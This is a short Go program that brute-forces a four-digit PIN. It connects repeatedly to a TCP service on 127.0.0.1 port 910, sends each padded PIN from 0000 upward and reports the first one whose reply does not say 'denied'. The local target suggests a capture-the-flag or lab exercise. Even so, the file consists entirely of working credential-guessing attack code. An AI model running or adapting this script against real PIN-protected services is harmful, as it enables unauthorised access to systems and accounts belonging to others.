package main

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"strings"
	"time"
)

func main() {
	for pin := 0000; pin < 9999; pin++ {
		// Connect socket
		conn, err := net.Dial("tcp", "127.0.0.1:910")
		if err != nil {
			fmt.Println(err)
			os.Exit(1)
		}
		// Allign pin 1 to 0001 for example
		allignedPin := fmt.Sprintf("%04d", pin)
		sock := bufio.NewReader(conn)
		// Read until ]
		sock.ReadBytes(byte(']'))
		// Send pin number
		conn.Write([]byte(allignedPin))
		conn.Write([]byte("\n"))

		// Read status EOL
		final, _, _ := sock.ReadLine()
		// If it returns denied print with status line
		if strings.Contains(string(final), "denied") {
			fmt.Println(string(final), allignedPin)
		} else {
			// Yay we found correct pin
			fmt.Println(string(final), "Found:", allignedPin)
			status, _ := sock.ReadBytes(byte('\n'))
			if len(status) > 0 {
				fmt.Println(string(status))
			}
			os.Exit(1)
		}
		conn.Close()
		// Wait until close
		time.Sleep(200 * time.Millisecond)
	}
}
